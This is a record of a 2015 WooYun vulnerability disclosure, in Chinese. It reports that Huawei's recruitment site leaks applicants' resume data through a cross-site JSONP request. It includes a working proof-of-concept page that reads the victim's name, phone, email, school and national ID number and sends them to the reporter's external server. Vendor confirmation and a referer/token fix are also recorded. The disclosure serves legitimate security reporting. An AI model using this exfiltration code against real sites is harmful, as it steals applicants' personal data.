{"id": 26266, "wybug_id": "wooyun-2015-0129124", "wybug_title": "华为某分站敏感信息泄露漏洞", "wybug_corp": "华为技术有限公司", "wybug_author": "Friday", "wybug_date": "2015-07-28 14:49", "wybug_open_date": "2015-09-11 16:22", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向公众公开  简要描述： 华为某分站敏感信息泄露漏洞，和JSONP一个原理 详细说明：  URL：https://career.huawei.com/recruitment/servlet/getHeaderInfohttps://career.huawei.com/recruitment/servlet/getUserResumeInfo华为招聘，在登录系统之后，会向服务器发出两个AJAX请求，分别是请求账户信息，简历信息。但是在请求的时候没有添加验证（Token或referer），导致可被CSRF，即黑客可以通过给用户发送一个链接，用户在登录了华为招聘的网站的情况下（浏览器开启之后，登录过即可，不需要保证窗口开启），点击该链接，就会导致自己的敏感信息泄露，包括身份证，学校，专业等（简历中有的都会被泄露。）测试链接：http://friday.sinaapp.com/huawei.html代码：\n<meta charset=\"utf-8\"><table id=\"info_table\" style=\"width: 1000px;margin: 100 auto;\" border=\"1\">\t<tr><td>系统正在请求数据，请耐心等待！</td></tr>\t</table><div id=\"submit\" style=\"width: 1000px;margin: 100 auto;display: none\">\t<input type=\"submit\" value=\"确认提交\" onclick=\"alert('已成功提交，请耐心等待！');window.close()\"/></div><script type=\"text/javascript\">\ttable = document.getElementById(\"info_table\")\tsetTimeout(function(){\t\tif(statu == 0){\t\t\ttable.innerHTML = \"<tr><td style='color:red'>检测到您尚未登录！点击跳转：<a href='https://career.huawei.com/recruitment/'>华为招聘</a></td></tr>\"\t\t}\t},5000);</script><script src=\"http://career.huawei.com/recruitment/servlet/getUserResumeInfo\"></script><script type=\"text/javascript\">\ttable = document.getElementById(\"info_table\")\tstatu = 0\tif( JSON.stringify(resume).length > 1000 ){\t\talert(\"你好，请先确认信息是否正确!\\n\")\t\tstr = \"<tr><td>姓名：</td><td>\"+resume.name+\"</td><td>专业：</td><td>\"+resume.firstMajor+\"</td></tr><tr><td>手机：</td><td>\"+resume.mobilePhone+\"</td><td>国籍：</td><td>\"+resume.nationality+\"</td></tr><tr><td>学校：</td><td>\"+resume.establishment+\"</td><td>邮箱：</td><td>\"+resume.email+\"</td></tr><tr><td>身份证号</td><td>\"+resume.indentifiedId+\"</td></tr>\"\t\ttable.innerHTML = str\t\tdocument.getElementById(\"submit\").style.display = 'block'\t\tstatu = 1\t\tvar script = document.createElement('script')\t\tscript.src = 'http://friday.sinaapp.com/hack.js?resume='+resume.name+'_'+resume.firstMajor+'_'+resume.mobilePhone+'_'+resume.establishment+'_'+resume.email+'_'+resume.indentifiedId\t\tdocument.body.appendChild(script)\t}</script>\n   漏洞证明：  点击URL后，如果招聘网是登录状态：\n\n测试代码中，将敏感信息发送到了远程服务器，日志信息如下：\n\nURL解码后即可获得详细信息.华为招聘那么多学生，随便扔个链接到招聘群= =估计中招的会有很多吧。。。不过卤煮胆子小= =还是算了。。。   修复方案：  在返回信息的时候，验证refer/token华为大厂，求高rank~求礼物~   版权声明：转载请注明来源 Friday@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-07-28 16:21 厂商回复： 非常感谢Friday提交的漏洞，我们已经将这个漏洞通知了业务部门，他们将会尽快修复这个漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}